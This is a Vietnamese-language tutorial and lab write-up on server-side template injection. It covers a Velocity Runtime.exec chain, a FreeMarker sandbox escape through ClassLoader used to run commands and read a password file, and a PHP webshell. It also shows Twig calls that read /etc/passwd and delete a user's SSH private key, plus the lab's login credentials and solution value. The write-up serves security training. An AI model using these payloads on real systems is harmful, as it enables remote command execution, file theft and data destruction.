Như đã mô tả ở trên, bước đầu tiên là xác định các đối tượng và phương thức mà bạn có thể truy cập. Một số đối tượng có thể ngay lập tức thu hút sự chú ý của bạn. Bằng cách kết hợp kiến thức của bản thân với thông tin từ tài liệu, có thể lập ra danh sách các đối tượng cần điều tra kỹ lưỡng hơn.

- Nghiên cứu tài liệu
- Khi tìm hiểu tài liệu về các đối tượng, hãy đặc biệt chú ý:
  - Những phương thức mà đối tượng cung cấp: Điều này giúp bạn hiểu rõ cách đối tượng hoạt động và những gì có thể thực hiện.
  - Những đối tượng được trả về bởi các phương thức đó: Từ đó, có thể hình dung các chuỗi đối tượng tiềm năng.

Khi đi sâu vào tài liệu, có thể phát hiện cách kết hợp các đối tượng và phương thức để tạo ra chuỗi đối tượng (object chain). Kết hợp đúng các chuỗi đối tượng và phương thức có thể cho phép truy cập vào các chức năng nguy hiểm hoặc dữ liệu nhạy cảm vốn không dễ dàng đạt được ban đầu.

Ví dụ: Khai thác trong `Velocity Engine`
Trong engine template dựa trên `Java`, `Velocity`, có quyền truy cập vào một đối tượng `ClassTool` được gọi là `$class`. Qua việc nghiên cứu tài liệu, sẽ phát hiện rằng:

- Phương thức `$class.inspect()` có thể được dùng để kiểm tra thông tin về các lớp Java.
- Thuộc tính `$class.type` có thể được dùng để lấy tham chiếu tới các đối tượng tùy ý.

Bằng cách kết hợp phương thức và thuộc tính này, có thể tạo ra một chuỗi đối tượng để truy cập các chức năng nguy hiểm. Một ví dụ khai thác trong quá khứ đã từng sử dụng chuỗi này để thực thi các lệnh trên hệ thống mục tiêu:

```
$class.inspect("java.lang.Runtime").type.getRuntime().exec("bad-stuff-here")
```

> Chuỗi này cho phép kẻ tấn công gọi tới các lệnh hệ thống thông qua đối tượng `Runtime` trong `Java`.

- Lưu ý quan trọng:
  - Việc sử dụng các chuỗi đối tượng yêu cầu phải hiểu rõ về các đối tượng có sẵn, các phương thức và thuộc tính của chúng, cũng như cách chúng liên kết với nhau.
  - Kỹ thuật này chỉ nên được thực hành trong môi trường thử nghiệm hoặc lab và chỉ khi có sự cho phép rõ ràng.

### Lab: Server-side template injection in a sandboxed environment

Bài lab này sử dụng template engine `Freemarker`. Nó dễ bị tấn công bởi việc tiêm mẫu phía máy chủ do `sandbox` được triển khai kém. Để giải quyết bài thí nghiệm, hãy thoát ra khỏi `sandbox` để đọc tệp `my_password.txt` từ thư mục chính của `Carlos`. Sau đó gửi nội dung của tập tin.

Kiểm chứng cho thấy đúng là bài lab sử dụng template engine là `FreeMarker`

![image-35]()

Bài lab này khá giống việc sử dụng document FreeMarker để đọc tệp của Carlos bằng cách implement `TemplateModel`, class `Execute` để có thể thực thi được các lệnh `shell`

```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
```

Nhưng lần này nó đã bị `sandbox` chặn thực thi do `FreeMarker` đã được cấu hình với một bộ `TemplateClassResolver` bảo mật. Bộ này giới hạn các lớp mà `template` có thể truy cập hoặc khởi tạo, nhằm ngăn chặn các hành vi không an toàn như thực thi lệnh hệ thống hoặc truy cập tài nguyên không mong muốn.

Vì vậy để có thể bypass được `sandboxed environment` này có thể nghĩ đến tạo tham chiếu đến `ClassLoader` để lấy `ClassLoader` hiện tại , từ đó cho phép tải các lớp Java(do `TemplateClassResolver` kiểm soát việc tải các lớp Java trong môi trường `FreeMarker`), vì vậy không trực tiếp yêu cầu `FreeMarker` tải lớp mới. Thay vào đó, sử dụng các đối tượng có sẵn trong môi trường và các phương pháp gián tiếp để "lách" qua rào cản, ở đây đối tượng có sẵn chính là `product`. Payload như sau(tham khảo ở [hacktricks](https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection))

```
<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

![image-37]()

Bây giờ liệt kê các file và thư mục của `Carlos` và đọc file `my_password.txt` và solve bài lab

![image-38]()

Payload cuối cùng:

```
<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("cat my_password.txt")}
```

![image-39]()

> kb6z13yeq4c1e9t8g25n

#### Constructing a custom exploit using developer-supplied objects

Một số công cụ `template engine` được thiết kế để chạy trong môi trường bảo mật, giới hạn quyền truy cập nhằm giảm thiểu rủi ro đến mức tối đa. Mặc dù điều này làm cho việc khai thác template trở nên khó khăn hơn để thực thi mã từ xa, các đối tượng do nhà phát triển tạo ra và được cung cấp cho template lại mang đến một bề mặt tấn công khác, ít được bảo vệ hơn.

Tuy nhiên, trong khi tài liệu chi tiết thường được cung cấp cho các đối tượng tích hợp sẵn của template engine, các đối tượng cụ thể của từng trang web gần như chắc chắn không được tài liệu hóa. Do đó, việc tìm cách khai thác chúng sẽ yêu cầu phải tự điều tra hành vi của trang web, xác định bề mặt tấn công và tự xây dựng một khai thác tùy chỉnh phù hợp

### Lab: Server-side template injection with a custom exploit

Để giải quyết phòng thí nghiệm, hãy tạo một khai thác tùy chỉnh để xóa tệp `/.ssh/id_rsa` khỏi thư mục gốc của `Carlos`.

Đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: `wiener:peter`

Khác với các bài lab trước ngoài tính năng `Preferred name`, còn có thêm chức năng `Upload avatar`

![image-40]()

Chức năng comment hiển thị với tên được chọn từ `Preferred name`

![image-41]()

Tiếp tục kiểm tra xem bài lab sử dụng template engine nào bằng các payload ví dụ như `{{<%[%'"}}%\`, nhưng lần này trang web không hiển thị thông báo gì về lỗi để phát hiện template engine nào cả thay vào nó hiển thị nguyên bản đoạn fuzzing string được inject vào

![image-42]()

Có lẽ ở đây đã được fix, chúng ta vẫn còn 2 điểm nữa có thể khai thác là `Preferred name` và `Upload avatar`, tiếp tục thử payload với `Preferred name`

Ngay cả khi test với một `attributed` không tồn tại nó sẽ trả về null

![image-43]()

Vậy nếu không truyền vào `attributed` thì server sẽ render ra sao -> tiết lộ template là `Twig`

![image-44]()

Tiếp tục kiểm tra đến chức năng cập nhật avatar , tiến hành upload một bức ảnh dạng `PNG` và tất nhiên sẽ được update thành công, sau đó tôi nghĩ đến việc liệu mình có thể upload lên một `webshell` có dạng `php` hay không với một payload đơn giản và nhận lại được một thông báo lỗi, đó có thể là một gợi ý

```
<?php system($_GET['cmd']); ?>
```

![image-45]()

![image-46]()

```
PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: application/octet-stream in /home/carlos/User.php:28
Stack trace:
#0 /home/carlos/avatar_upload.php(19): User->setAvatar('/tmp/script.php', 'application/oct...')
#1 {main}
  thrown in /home/carlos/User.php on line 28
```

> Ngoại lệ xảy ra do file upload lên không đúng `mime` type, tiếp nữa là file xử lý sẽ là `avatar_upload.php` với phần format là User->setAvatar()

- Ở đây phương thức setAvatar có vẻ nhận vào hai đối số đối số thứ nhất là file ảnh upload lên và mime type của file ảnh, do nó chỉ chấp nhận định dạng ảnh tôi nghĩ đến việc chỉnh sửa `Content-Type` thành `image/jpeg(gửi đến Repeater)`, bây giờ việc upload lên không gặp bất kỳ khó khăn gì

  ![image-47]()

  > Hình ảnh sẽ không hiển thị lên được do nó không phải một mime type hợp lệ

  - Kiểm chứng ở phần comment của user check source và download được file có tên là `avatar` chính là nội dung payload ở trên

    ![image-48]()

  - Tôi nghĩ đến việc lợi dụng upload avatar này kết hợp với function setAvatar(), chú ý đến các tham số ở trên như `blog-post-author-display=user.name&csrf=j2jzaPVuqOTmWMGDBKBRv4WBlHaP0SpV` liệu có thể lợi dụng hàm `setAvatar()` để cập nhật avatar render template hay không, ở đây tôi xử lý ở `/my-account/change-blog-post-author-display` với payload

    ```
    blog-post-author-display=user.setAvatar('/etc/passwd')&csrf=j2jzaPVuqOTmWMGDBKBRv4WBlHaP0SpV
    ```

    ![image-49]()

    Nhận về một thông báo lỗi , có vẻ như lỗi do truyền thiếu đối số khi hàm setAvatar() nhận vào 2 đối số , tôi sửa lại payload như sau

    ```
    blog-post-author-display=user.setAvatar('/etc/passwd','image/jpeg')&csrf=j2jzaPVuqOTmWMGDBKBRv4WBlHaP0SpV
    ```

    ![image-50]()

    > Đọc nội dung file `/etc/passwd` thành công

- Bây giờ đọc nội dung file `User.php` của `Carlos` tương tự như trên

```
blog-post-author-display=user.setAvatar('/home/carlos/User.php','image/jpeg')&csrf=j2jzaPVuqOTmWMGDBKBRv4WBlHaP0SpV
```

> Đọc nội dung file `User.php` thành công

```
<?php

class User {
    public $username;
    public $name;
    public $first_name;
    public $nickname;
    public $user_dir;

    public function __construct($username, $name, $first_name, $nickname) {
        $this->username = $username;
        $this->name = $name;
        $this->first_name = $first_name;
        $this->nickname = $nickname;
        $this->user_dir = "users/" . $this->username;
        $this->avatarLink = $this->user_dir . "/avatar";

        if (!file_exists($this->user_dir)) {
            if (!mkdir($this->user_dir, 0755, true))
            {
                throw new Exception("Could not mkdir users/" . $this->username);
            }
        }
    }

    public function setAvatar($filename, $mimetype) {
        if (strpos($mimetype, "image/") !== 0) {
            throw new Exception("Uploaded file mime type is not an image: " . $mimetype);
        }

        if (is_link($this->avatarLink)) {
            $this->rm($this->avatarLink);
        }

        if (!symlink($filename, $this->avatarLink)) {
            throw new Exception("Failed to write symlink " . $filename . " -> " . $this->avatarLink);
        }
    }

    public function delete() {
        $file = $this->user_dir . "/disabled";
        if (file_put_contents($file, "") === false) {
            throw new Exception("Could not write to " . $file);
        }
    }

    public function gdprDelete() {
        $this->rm(readlink($this->avatarLink));
        $this->rm($this->avatarLink);
        $this->delete();
    }

    private function rm($filename) {
        if (!unlink($filename)) {
            throw new Exception("Could not delete " . $filename);
        }
    }
}

?>
```

- Trong file `User.php` chúng ta có quyền truy cập vào function `gdprDelete()` xóa ảnh đại diện của người dùng. Vậy bây giờ để xóa được tệp `.ssh/id_rsa` đơn giản ta chỉ cần set tệp là `avatar` và gọi hàm `gdprDelete()`(tất nhiên đây là hàm không nhận đối số truyền vào) để solve bài lab

```
user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')
user.gdprDelete()
```
